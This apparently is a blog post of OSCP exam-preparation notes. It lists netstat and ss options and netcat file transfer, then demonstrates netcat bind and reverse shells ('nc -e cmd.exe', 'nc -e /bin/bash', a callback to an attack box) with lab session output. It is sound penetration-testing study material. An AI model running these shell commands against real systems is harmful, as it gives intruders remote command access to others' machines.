https://www.jpsecnetworks.com/week-2-oscp-preparation-linux-review-part-ii/

netstat
=======
monitoring network connections both incoming and outgoing as well as viewing routing tables, interface statistics etc

    # netstat -an  / Lists all ports (both TCP and UDP)
    # netstat -antp /  Lists only TCP (Transmission Control Protocol) port connections
    # netstat -anup  / Lists only UDP (User Datagram Protocol) port connections
    # netstat -l / Lists all active listening ports
    # netstat – lnxp / Lists all active UNIX listening ports
    # netstat -lnup / Lists all active udp listeninig ports
    # netstat – lntp  / Lists all active tcp listeninig
    # netstat -s / Displays statistics by protocol. By default, statistics are shown for the TCP, UDP, ICMP, and IP protocols. The -s parameter can be used to specify a set of protocols
    # netstat -su / Displays statics for udp
    # netstat -st / Displays statics for tcp
    # netstat -4 /  Displays active connections for ipv4
    # nestat -4ntp / Displays active connections for ipv4 listenning on tcp ports
    # netstat -ac / Displays Promiscuous mode with -ac switch. Default screen refresh in every second
    # netstat -actnp 5 / refreshes every 5 seconds for all tcp ports
    # netstat -lctnp 5 / refreshes every 5 seconds for all tcp listening ports
    # netstat -ie / Displays information about network interfaces. Similar to ifconfig
    # netstat -r / Displays Kernel IP routing table with netstat and route command
    # netstat -i / Displays network interface packet transactions including both transferring and receiving packets with MTU size
    # netstat -ic 5 / refreshes every 5 seconds


Transfering files with Netcat
-----------------------------
– Configure the listener / server to listen on port any tcp/udp port and redirect the incoming input into a file.

    # nc -nvlp 65535 > file_received.txt
    Listening on [0.0.0.0] (family 0, port 65535)

– Connect to the server from the client and send the file:

    # nc -nv 192.168.0.252 65535 < /file_sent.txt
    (UNKNOWN) [192.168.0.252] 65535 (?) open






ss (Socket Statistic)
=====================
Similar to netstat, in that it is used to display useful network socket information

    # ss -lntp / same as netstat -lntp
    # ss -lnup / same as netstat -lnup
    # ss -4ntp / same as nestat -4ntp





Netcat Bind Shell
=================

– bind shell is a shell that binds to a specific port on the target host to listen for incoming connections.

Windows:

– Configure the listener / server to listen on any tcp/udp port and bind it to a shell.

C:>nc -nlvp 65535 -e cmd.exe

–  Connect to the server from the client:

    root@kali:/# nc -nv 192.168.0.112 65535
    (UNKNOWN) [192.168.0.112] 65535 (?) open
    Microsoft Windows XP [version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:\netcat-win32-1.12>dir

     Pasta de C:\netcat-win32-1.12

    11/09/2018  22:54    <DIR>          .
    11/09/2018  22:54    <DIR>          ..
    11/09/2018  22:54            12.166 doexec.c
    11/09/2018  22:54            69.850 netcat.c
    11/09/2018  22:54             6.885 readme.txt
    11 arquivo(s)        287.710 bytes
    2 pasta(s)  6.519.844.864 bytes disponiveis

    C:\netcat-win32-1.12>

LINUX:

– Configure the listener / server to listen on any tcp/udp port and bind it to a shell.

    root@kali:/# nc -nvlp 4444 -e /bin/bash
    listening on [any] 4444 …

–  Connect to the server from the client:

    root@jp_raspberrypi:~# nc -nv 192.168.0.109 4444
    Connection to 192.168.0.109 4444 port [tcp/*] succeeded!
    pwd
    /
    cd /home
    pwd
    /home

    ls -l
    total 4
    drwxr-xr-x 15 jp jp 4096 Sep 10 22:44 jp
    ^C
    root@jp_raspberrypi:~#

Netcat Reverse Shell
====================

A reverse shell is a shell initiated from the target host back to the attack box which is in a listening state to pick up the shell.
In order to setup a Netcat reverse shell we need to follow the following steps:


– Setup a Netcat listener on the attack box listening on port 4444.

    root@kali:/# nc -nlvp 4444
    listening on [any] 4444 …

– Connect to the Netcat listener from the target host.

    C:>nc 192.168.0.109 4444 -e cmd.exe

– Issue commands on the target host from the attack box.

    Root@kali:/# nc -nlvp 4444
    listening on [any] 4444 …
    connect to [192.168.0.109] from (UNKNOWN) [192.168.0.112] 1153
    Microsoft Windows XP [version 5.1.2600]
    (C) Copyright 1985-2001 Microsoft Corp.

    C:\netcat-win32-1.12>dir
    dir
    Pasta de C:\netcat-win32-1.12
    11/09/2018  22:54    <DIR>          .
    11/09/2018  22:54    <DIR>          ..
    11/09/2018  22:54            12.166 doexec.c
    11/09/2018  22:54            38.616 nc.exe
    11/09/2018  22:54            45.272 nc64.exe
    11/09/2018  22:54            69.850 netcat.c
    11/09/2018  22:54             6.885 readme.txt
    11 arquivo(s)        287.710 bytes
    2 pasta(s)  6.496.792.576 bytes disponiveis

    C:\netcat-win32-1.12>
